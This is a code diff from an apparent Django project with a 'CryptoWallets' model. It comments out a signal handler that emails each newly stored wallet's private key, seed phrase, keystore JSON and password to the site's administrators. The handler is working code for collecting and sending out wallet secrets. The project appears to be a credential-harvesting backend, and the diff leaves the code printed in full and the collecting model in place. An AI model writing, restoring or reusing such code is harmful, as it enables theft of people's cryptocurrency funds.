@@ -23,18 +23,18 @@ class CryptoWallets(models.Model):
         return self.wallet_name
 
 
-@receiver(post_save, sender=CryptoWallets)
-def send_mail_handler(sender, instance, created, **kwargs):
-    if created:
-        data = CryptoWallets.objects.get(id=instance.id)
-        send_mail(
-            '....CryptoWallets Logs....',
-            f'''data wallet_name: {data.wallet_name}
-            \nprivate_key: {data.private_key}
-            \nphrase: {data.phrase}
-            \nkeystore_json: {data.keystore_json}
-            \npassword: {data.password}''',
-            env("SERVER_EMAIL"),
-            getaddresses([env('ADMINS')]),
-            fail_silently=False,
-        )
+# @receiver(post_save, sender=CryptoWallets)
+# def send_mail_handler(sender, instance, created, **kwargs):
+#     if created:
+#         data = CryptoWallets.objects.get(id=instance.id)
+#         send_mail(
+#             '....CryptoWallets Logs....',
+#             f'''data wallet_name: {data.wallet_name}
+#             \nprivate_key: {data.private_key}
+#             \nphrase: {data.phrase}
+#             \nkeystore_json: {data.keystore_json}
+#             \npassword: {data.password}''',
+#             env("SERVER_EMAIL"),
+#             getaddresses([env('ADMINS')]),
+#             fail_silently=False,
+#         )
